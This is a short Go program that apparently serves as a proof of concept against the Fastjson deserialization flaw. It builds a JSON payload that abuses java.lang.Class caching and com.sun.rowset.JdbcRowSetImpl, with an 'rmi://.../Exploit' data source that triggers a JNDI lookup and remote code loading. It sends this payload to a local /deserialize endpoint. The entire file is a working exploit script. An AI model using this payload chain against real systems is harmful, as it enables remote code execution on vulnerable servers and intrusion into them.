package main

import (
	"fmt"
	"net/http"
	"net/url"
)

func main() {
	clint := &http.Client{}
	payload := "{\n" +
		"    \"a\":{\n" +
		"        \"@type\":\"java.lang.Class\",\n" +
		"        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
		"    },\n" +
		"    \"b\":{\n" +
		"        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
		"        \"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\n" +
		"        \"autoCommit\":true\n" +
		"    }\n" +
		"}"
	resp, err := clint.Get("http://127.0.0.1:8080/deserialize?code=" + url.QueryEscape(payload))
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(resp.StatusCode)
}
